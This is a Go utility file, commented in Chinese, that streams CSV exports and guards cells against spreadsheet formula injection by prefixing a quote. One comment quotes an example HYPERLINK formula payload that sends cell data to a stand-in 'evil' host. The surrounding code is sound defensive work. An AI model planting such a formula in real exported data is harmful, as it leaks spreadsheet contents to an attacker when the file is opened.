package utils

import (
	"encoding/csv"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"
)

// WriteCSV 以流式方式写出 CSV 响应。
// 会写入 UTF-8 BOM，确保 Excel 直接打开时中文不乱码。
func WriteCSV(w http.ResponseWriter, filename string, header []string, rows [][]string) error {
	w.Header().Set("Content-Type", "text/csv; charset=utf-8")
	w.Header().Set("Content-Disposition", contentDisposition(filename))
	w.Header().Set("Cache-Control", "no-store")

	// UTF-8 BOM
	if _, err := w.Write([]byte{0xEF, 0xBB, 0xBF}); err != nil {
		return err
	}

	cw := csv.NewWriter(w)
	if err := cw.Write(sanitizeRow(header)); err != nil {
		return err
	}
	for _, row := range rows {
		if err := cw.Write(sanitizeRow(row)); err != nil {
			return err
		}
	}
	cw.Flush()
	return cw.Error()
}

// sanitizeRow 逐格做公式注入防护。
// 刻意不改动入参：调用方可能传入包级共享的表头切片，
// 就地修改会永久污染它。
func sanitizeRow(row []string) []string {
	out := make([]string, len(row))
	for i, cell := range row {
		out[i] = CSVSafe(cell)
	}
	return out
}

// CSVSafe 防止 CSV 公式注入（CSV Injection / Formula Injection）。
//
// Excel、WPS、Numbers 会把以 = + - @ 开头的单元格当成**公式**求值，
// 而本系统导出的商品名、SKU、库位、单据号、备注、供应商名、操作人姓名
// 全都是仓管员可控的自由输入。攻击者只要把商品名改成
// `=HYPERLINK("http://evil/?"&A1,"点我")` 之类的载荷，管理员导出后
// 用 Excel 打开就会触发，等于把「能改库存的人」升级成
// 「能在管理员电脑上执行公式的人」。
//
// 前置一个单引号即可让表格软件按纯文本处理。
// 纯数字（含负数、小数）除外 —— 否则 `-5` 会被写成 `'-5`，
// 导出后变成文本，排序与求和都会失效。
//
// ⚠️ 判定必须先剥掉前导空白：表格软件在判断「是不是公式」时同样会
// 忽略前导空白，只看 s[0] 的话 " =HYPERLINK(...)"、" \t+1+1" 这类
// 载荷会走 default 分支原样导出，而打开时照样被当公式求值 ——
// 等于防护形同虚设。负数的 ParseFloat 也要用剥过空白的值，
// 否则 " -5" 会被误判成公式而写成文本。
func CSVSafe(s string) string {
	if s == "" {
		return s
	}
	trimmed := strings.TrimLeft(s, " \t\r\n\v\f")
	if trimmed == "" {
		// 整格都是空白：剥掉之后无内容可求值，保持原样即可
		return s
	}
	switch trimmed[0] {
	case '=', '+', '@':
		// 一律转义
	case '-':
		// 负数是最常见的「危险前缀」，必须放行
		if _, err := strconv.ParseFloat(trimmed, 64); err == nil {
			return s
		}
	default:
		return s
	}
	return "'" + s
}

// contentDisposition 构造兼容中文文件名的 Content-Disposition 头。
func contentDisposition(filename string) string {
	safe := strings.Map(func(r rune) rune {
		if r < 32 || r == '"' || r == '\\' || r > 127 {
			return '_'
		}
		return r
	}, filename)
	return "attachment; filename=\"" + safe + "\"; filename*=UTF-8''" + url.PathEscape(filename)
}

// TimestampedFilename 生成带时间戳的导出文件名，例如 商品列表_20260928_1030.csv。
func TimestampedFilename(prefix string) string {
	return prefix + "_" + time.Now().In(DisplayZone).Format("20060102_1504") + ".csv"
}
